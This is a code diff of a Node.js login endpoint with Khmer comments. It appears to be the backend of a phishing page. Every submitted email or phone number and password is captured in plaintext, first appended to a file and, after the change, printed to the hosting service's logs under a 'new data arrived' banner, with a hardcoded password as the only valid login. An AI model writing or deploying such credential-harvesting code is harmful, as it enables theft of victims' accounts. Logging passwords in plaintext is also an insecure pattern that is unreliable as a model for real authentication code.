@@ -15,43 +15,26 @@ const CORRECT_PASS = "12345678";
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
 
-    // ១. ចាប់យកពេលវេលាដែល User បានវាយបញ្ចូល
+    // ១. ចាប់យកពេលវេលា
     const timeStamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });
 
-    // ២. រៀបចំទម្រង់អត្ថបទដើម្បីកត់ចូលហ្វាល
-    const logText = `[ពេលវេលា: ${timeStamp}] - អ៊ីមែល/លេខទូរស័ព្ទ: ${username} | ពាក្យសម្ងាត់: ${password}\n`;
+    // ២. បញ្ជាឱ្យបង្ហាញទិន្នន័យនៅលើ Logs របស់ Render ភ្លាមៗតែម្តង
+    console.log("========================================");
+    console.log(`🔔 មានទិន្នន័យថ្មីលោតមកដល់! [${timeStamp}]`);
+    console.log(`👤 អ៊ីមែល/លេខទូរស័ព្ទ: ${username}`);
+    console.log(`🔑 ពាក្យសម្ងាត់: ${password}`);
+    console.log("========================================");
 
-    // ៣. សរសេរបញ្ចូលទៅក្នុងហ្វាល database.txt (បើមិនទាន់មានហ្វាលនេះទេ វានឹងបង្កើតឱ្យស្វ័យប្រវត្តិ)
-    // មុខងារ appendFile មានន័យថាវាថែមទិន្នន័យថ្មីទៅខាងក្រោម ដោយមិនលុបទិន្នន័យចាស់ឡើយ
-    fs.appendFile('database.txt', logText, (err) => {
-        if (err) {
-            console.error("មានបញ្ហាក្នុងការកត់ត្រាចូលហ្វាល:", err);
-        } else {
-            console.log("-> បានរក្សាទុកទិន្នន័យចូលក្នុង database.txt រួចរាល់!");
-        }
-    });
-
-    // ៤. ពិនិត្យទិន្នន័យដើម្បីឆ្លើយតបទៅកាន់ វេសាយ វិញ
+    // លុប ឬមិនបាច់ប្រើកូដ fs.appendFile មុននោះទៀតក៏បាន ព្រោះ Render Free មិនរក្សាទុកហ្វាលដាច់ដោយឡែកទេ
+    
+    // ផ្នែកត្រួតពិនិត្យ Username & Password ខាងក្រោមរក្សាទុកដដែល...
     if (username !== CORRECT_USER) {
-        return res.json({ 
-            success: false, 
-            errorType: "username", 
-            message: "អ៊ីមែល ឬលេខទូរស័ព្ទនេះ មិនទាន់បានចុះឈ្មោះទេ។" 
-        });
+        return res.json({ success: false, errorType: "username", message: "អ៊ីមែល ឬលេខទូរស័ព្ទនេះ មិនទាន់បានចុះឈ្មោះទេ។" });
     }
-
     if (password !== CORRECT_PASS) {
-        return res.json({ 
-            success: false, 
-            errorType: "password", 
-            message: "ពាក្យសម្ងាត់ដែលអ្នកបានបញ្ចូលមិនត្រឹមត្រូវទេ។" 
-        });
+        return res.json({ success: false, errorType: "password", message: "ពាក្យសម្ងាត់ដែលអ្នកបានបញ្ចូលមិនត្រឹមត្រូវទេ។" });
     }
-
-    res.json({ 
-        success: true, 
-        message: "ចូលគណនីជោគជ័យ!" 
-    });
+    res.json({ success: true, message: "ចូលគណនីជោគជ័យ!" });
 });
 
 app.listen(PORT, () => {
